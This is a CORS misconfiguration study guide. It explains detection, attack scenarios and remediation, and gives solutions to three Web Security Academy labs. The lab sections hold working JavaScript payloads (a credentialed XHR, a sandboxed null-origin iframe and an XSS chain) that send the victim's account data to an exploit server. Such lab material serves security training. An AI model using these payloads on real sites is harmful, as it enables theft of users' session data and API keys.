## 1. Vulnerability Core

- **Vulnerability Type:** Insecure CORS Configuration
    
- **Core Meaning:** CORS is a browser mechanism that selectively relaxes the Same-Origin Policy (SOP). SOP blocks scripts on one origin (combination of scheme, domain, and port) from reading data from another. A misconfigured CORS policy trusts arbitrary or malicious origins, allowing external sites to steal sensitive session data.
    
- **The CSRF Misconception:** **CORS does not protect against CSRF.** It regulates response readability, not request execution. Poor CORS setups can exacerbate data exposure resulting from cross-origin actions.

## 2. Detection & Attack Surface Mapping

To find CORS flaws, analyze responses to sensitive endpoints (e.g., user profiles, API keys) by injecting variations into the `Origin` request header:

1. **Arbitrary Reflection:** Inject `Origin: https://attacker.com` → Check if reflected in `Access-Control-Allow-Origin` (ACAO) along with `Access-Control-Allow-Credentials: true` (ACAC).
    
2. **Regex Prefix/Suffix Flaws:** Try `Origin: https://victim.com.attacker.com` or `Origin: https://attacker-vulnerable.com`.
    
3. **Null Origin Trust:** Inject `Origin: null` → Check if accepted.
    
4. **Protocol Downgrade:** Try `Origin: http://subdomain.victim.com` on an HTTPS application to spot unencrypted traffic trust patterns.


## 3. Classifications (The Scenarios)

### Dynamic Origin Reflection

To support multiple domains, backends dynamically mirror the request's `Origin` header directly into the ACAO response. If paired with `Access-Control-Allow-Credentials: true`, any site can read the user's session data.
### Trusted Null Origin

The backend explicitly trusts `Access-Control-Allow-Origin: null`. Attackers can force a browser to output a `null` origin using sandboxed iframes or local file schemes to read restricted responses.

### Protocol and Subdomain Trust Relationships

An HTTPS site trusts internal HTTP subdomains. Because HTTP traffic is susceptible to Man-in-the-Middle (MITM) attacks or local Cross-Site Scripting (XSS), an attacker can breach the subdomain to pivot and extract assets from the main secure origin.


## 4. Remediation

- **Avoid Dynamic Reflection:** Never blindly echo the incoming `Origin` header.
    
- **Strict Whitelisting:** Use static literal matches or robust, secure regex verification patterns for origins.
    
- **Never Allow Wildcards with Credentials:** Do not combine `Access-Control-Allow-Credentials: true` with a wildcard `*` or a dynamic reflection mechanism.
    
- **Drop Null Value Trust:** Avoid whitelisting `Origin: null` for application configurations.


### **5. Lab Breakthroughs & Payloads**


### Lab1: CORS vulnerability with basic origin reflection

 - **Attack Vector:** Dynamic matching reflecting arbitrary external origins combined with authenticated session states.

	### **SOLUTION & PAYLOAD BREAKDOWN****


   **Step 1: Verify the Reflexive Pattern** Send the request `/accountDetails` into **Burp  Repeater**. Forcibly introduce an arbitrary source header line:

     HTTP

```
GET /accountDetails HTTP/1.1
Host: victim-id.web-security-academy.net
Origin: https://example.com
Cookie: session=USER_SESSION
```

- **Validation Check:** Verify if the backend echoes back `Access-Control-Allow-Origin: https://example.com` and sets `Access-Control-Allow-Credentials: true`.
    

   **Step 2: Deployment (Exploit Server Payload)** Host the following asynchronous data extraction script on your exploit server to steal the victim's API key:
 
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = 'https://exploit-server-id.exploit-server.net/log?key=' + btoa(this.responseText);
    };
    req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script>
 

### Lab2: CORS vulnerability with trusted null origin

- **Attack Vector:** The application explicitly trusts the `null` origin parameter.
    

 ### **SOLUTION & PAYLOAD BREAKDOWN** 
 
**Step 1: Verify Null Trust State** Send the targeted endpoint request to **Burp Repeater** and override the origin value:

HTTP

```
GET /accountDetails HTTP/1.1
Host: victim-id.web-security-academy.net
Origin: null
```

- **Validation Check:** Confirm the server explicitly returns `Access-Control-Allow-Origin: null`.

**Step 2: Sandboxed Sandbox Forgery (Exploit Server Payload)** Use a sandboxed `<iframe>` wrapper on your exploit server. A sandboxed frame lacks a unique domain context, forcing the browser to issue a `null` origin request string.


<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
    };
    req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script>"></iframe>


### Lab 3: CORS vulnerability with trusted insecure protocols

- **Attack Vector:** Trust relationship flaw combined with an XSS vector on an unencrypted HTTP subdomain routing layer.


### SOLUTION & PAYLOAD BREAKDOWN

**Step 1: Map Subdomain Trust & Vulnerable Endpoints**

1. In **Burp Repeater**, pass `Origin: http://subdomain.lab-id` to verify that HTTP subdomains are trusted.
    
2. Locate an unencrypted subdomain feature (e.g., checking stock via `http://stock.YOUR-LAB-ID.web-security-academy.net`).
    
3. Verify that the `productId` parameter inside the stock page is vulnerable to reflected XSS.
    

**Step 2: Craft the Chain Payload (Exploit Server Payload)** Host a payload that forces the victim's browser to visit the insecure subdomain, trigger XSS, and run JavaScript that extracts the main site's session data via its permissive CORS configuration.

<script>
    document.location = "http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req=new XMLHttpRequest();req.onload=function(){location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bencodeURIComponent(this.responseText);};req.open('GET','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();%3c/script>&storeId=1";
</script>